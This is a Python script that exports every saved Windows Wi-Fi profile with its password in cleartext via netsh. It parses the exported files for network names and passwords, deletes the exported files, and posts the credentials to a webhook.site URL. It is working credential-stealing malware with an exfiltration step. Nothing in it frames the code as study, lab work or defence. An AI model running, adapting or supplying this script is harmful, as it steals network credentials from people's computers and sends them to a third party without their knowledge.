import subprocess, os, sys, requests
import xml.etree.ElementTree as ET

# Replace with your webhook
url = 'https://webhook.site/ff88b344-7501-40f6-898a-be4d0cd863ec'

#List and dicts
wifi_files=[]
payload = {"SSID": [], "Password": []}

#Use Python to execute Windows command to get Wi-Fi profiles
command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True).stdout.decode()

#Grab current working directory
path = os.getcwd()

#Append all Wi-Fi XML files to list
for filename in os.listdir(path):
    if filename.endswith(".xml") and filename.startswith:
        wifi_files.append(filename)

#Parse XML files for SSID names and append to list
for file in wifi_files:
    tree = ET.parse(file)
    root = tree.getroot()
    ssid = root[0].text
    if root[4][0][1][2].text:
        password = root[4][0][1][2].text
    else:
        password = "Not found"
    payload["SSID"].append(ssid)
    payload["Password"].append(password)
    os.remove(file)

#Send the good stuff to your webhook
payload_str = " & ".join("%s=%s" % (key, value) for key, value in payload.items())
r = requests.post(url, params="format=json", data=payload_str)
